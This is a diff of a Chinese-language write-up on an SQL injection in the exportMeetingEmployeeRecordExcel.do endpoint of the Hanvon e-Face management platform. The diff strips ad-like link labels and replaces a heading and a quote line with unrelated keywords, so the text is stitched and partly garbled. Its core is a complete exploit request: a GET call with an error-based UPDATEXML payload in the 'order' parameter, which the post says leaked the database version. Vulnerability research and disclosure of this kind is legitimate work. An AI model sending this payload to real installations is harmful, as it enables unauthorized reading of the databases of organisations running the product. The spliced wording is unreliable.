@@ -20,14 +20,6 @@ V1.6.x
 
 # 漏洞分析
 
-深入探索
-
-数据安全咨询
-
-网络安全培训课程
-
-数据备份服务
-
 直接看 `MobiMeetingAppController` 里关于 `exportMeetingEmployeeRecordExcel` 的实现
 
 ```
@@ -72,17 +64,9 @@ V1.6.x
                 MeetingTpm meeting = this.meetingAsm.getMeetingById(meetingId);
 ```
 
-深入探索
-
-在线工具箱
-
-Web应用防火墙
-
-安全研究报告
-
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml
 
-漏洞利用分析
+软件
 
 ```
 <!--查询参会人员列表-->
@@ -132,7 +116,7 @@ Web应用防火墙
 >
 > 需要 meetingId 参数存在
 >
-> 软件
+> 计算机安全
 
 ```
 GET /manage/mobiMeetingApp/exportMeetingEmployeeRecordExcel.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
@@ -144,4 +128,4 @@ token: xxxxxx
 
 成功通过报错注入爆出数据库版本信息
 
-安全研究工具
+数据管理
